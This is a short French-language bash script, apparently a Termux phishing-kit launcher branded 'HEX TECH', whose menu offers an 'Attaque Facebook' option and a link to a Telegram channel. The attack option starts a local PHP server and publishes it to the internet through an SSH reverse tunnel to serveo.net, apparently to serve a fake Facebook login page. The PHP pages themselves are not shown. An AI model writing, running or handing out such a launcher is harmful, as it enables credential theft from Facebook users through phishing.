#!/bin/bash

# Couleurs
BLEU='\033[1;34m'
JAUNE='\033[1;33m'
ROUGE='\033[1;31m'
NC='\033[0m' # Pas de couleur

# Fonction pour démarrer le serveur et afficher le lien Serveo
demarrer_serveur() {
    echo -e "${BLEU}Démarrage du serveur PHP...${NC}"
    php -S localhost:3000 > /dev/null 2>&1 & # Lancer le serveur en arrière-plan
    sleep 2 # Attendre que le serveur démarre
    echo -e "${JAUNE}Connexion à Serveo pour générer un lien public...${NC}"
    ssh -R 80:localhost:3000 serveo.net
}

# Affichage du menu avec style
clear
echo -e "${BLEU}"
echo -e "=========================================="
echo -e "      ██╗  ██╗███████╗██╗  ██╗████████╗  "
echo -e "      ██║  ██║██╔════╝██║  ██║╚══██╔══╝  "
echo -e "      ███████║█████╗  ███████║   ██║     "
echo -e "      ██╔══██║██╔══╝  ██╔══██║   ██║     "
echo -e "      ██║  ██║███████╗██║  ██║   ██║     "
echo -e "      ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝     "
echo -e "=========================================="
echo -e "                  🦠         𝙷𝙴𝚇✦𝚃𝙴𝙲𝙷🦠            "
echo -e "=========================================="
echo -e "${NC}"

echo -e "${JAUNE}1. Attaque Facebook${NC}"
echo -e "${JAUNE}2. Rejoindre notre canal Telegram${NC}"

# Lecture du choix utilisateur
read -p "Choisissez une option (1 ou 2) : " choix

# Traitement du choix
if [ "$choix" == "1" ]; then
    echo -e "${ROUGE}Préparation de l'attaque Facebook...${NC}"
    demarrer_serveur
elif [ "$choix" == "2" ]; then
    echo -e "${BLEU}Ouverture de notre canal Telegram...${NC}"
    termux-open-url "https://t.me/+IcftRA7eTCNiOGFk"
else
    echo -e "${ROUGE}Option invalide. Quitter...${NC}"
fi